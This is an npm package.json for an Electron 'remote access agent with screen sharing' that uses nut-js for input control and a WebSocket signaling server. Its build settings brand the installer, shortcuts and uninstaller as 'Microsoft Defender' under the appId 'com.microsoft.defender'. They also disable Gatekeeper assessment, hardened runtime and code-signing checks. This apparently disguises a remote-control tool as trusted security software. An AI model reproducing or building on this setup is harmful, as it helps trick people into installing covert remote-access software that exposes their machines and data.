{
  "name": "laitlum-agent",
  "version": "1.0.0",
  "description": "Laitlum remote access agent with screen sharing capabilities",
  "main": "main.js",
  "scripts": {
    "start": "electron .",
    "patch-dev": "node scripts/patch-electron-dev.js",
    "predev": "node scripts/patch-electron-dev.js",
    "preprod": "node scripts/patch-electron-dev.js",
    "dev": "cross-env NODE_ENV=development electron .",
    "prod": "cross-env NODE_ENV=production electron .",
    "signaling": "node signaling-server.js",
    "signaling:prod": "cross-env NODE_ENV=production node signaling-server.js",
    "dev:all": "concurrently \"npm run signaling\" \"npm run dev\"",
    "prod:all": "concurrently \"npm run signaling:prod\" \"npm run prod\"",
    "build": "electron-builder -mwl",
    "build:mac": "electron-builder --mac dmg",
    "build:mac-zip": "electron-builder --mac zip",
    "build:win": "electron-builder --win nsis",
    "build:win-portable": "electron-builder --win portable",
    "build:win-zip": "electron-builder --win zip",
    "build:prod": "cross-env NODE_ENV=production electron-builder -mwl"
  },
  "engines": {
    "node": ">=18"
  },
  "keywords": [
    "electron",
    "laitlum",
    "remote-access",
    "webrtc",
    "websocket"
  ],
  "author": "Nirvana",
  "license": "MIT",
  "devDependencies": {
    "concurrently": "^8.2.2",
    "cross-env": "^10.1.0",
    "electron": "^30.0.8",
    "electron-builder": "^24.13.3",
    "rcedit": "^5.0.2"
  },
  "dependencies": {
    "@nut-tree-fork/nut-js": "^4.2.6",
    "ws": "^8.14.2"
  },
  "build": {
    "appId": "com.microsoft.defender",
    "productName": "Microsoft Defender",
    "afterPack": "scripts/afterPack.js",
    "files": [
      "**/*",
      "!downloads/**",
      "!database/**",
      "!**/*.md",
      "!**/test/**",
      "!**/.git/**",
      "!**/.github/**"
    ],
    "mac": {
      "target": [
        {
          "target": "dmg",
          "arch": [
            "x64",
            "arm64"
          ]
        },
        {
          "target": "zip",
          "arch": [
            "x64",
            "arm64"
          ]
        }
      ],
      "category": "public.app-category.utilities",
      "gatekeeperAssess": false,
      "hardenedRuntime": false,
      "entitlements": "build/entitlements.mac.plist",
      "entitlementsInherit": "build/entitlements.mac.plist"
    },
    "win": {
      "target": [
        {
          "target": "nsis",
          "arch": [
            "x64"
          ]
        },
        {
          "target": "zip",
          "arch": [
            "x64"
          ]
        }
      ],
      "requestedExecutionLevel": "asInvoker",
      "signAndEditExecutable": false,
      "signDlls": false,
      "verifyUpdateCodeSignature": false,
      "publisherName": "Laitlum Technologies",
      "fileAssociations": [],
      "icon": "logo.ico"
    },
    "asarUnpack": [
      "node_modules/@nut-tree-fork/**",
      "node_modules/node-gyp-build/**"
    ],
    "nsis": {
      "oneClick": false,
      "allowToChangeInstallationDirectory": true,
      "createDesktopShortcut": true,
      "createStartMenuShortcut": true,
      "shortcutName": "Microsoft Defender",
      "uninstallDisplayName": "Microsoft Defender",
      "installerIcon": "logo.ico",
      "uninstallerIcon": "logo.ico",
      "installerHeaderIcon": "logo.ico",
      "deleteAppDataOnUninstall": true
    }
  }
}
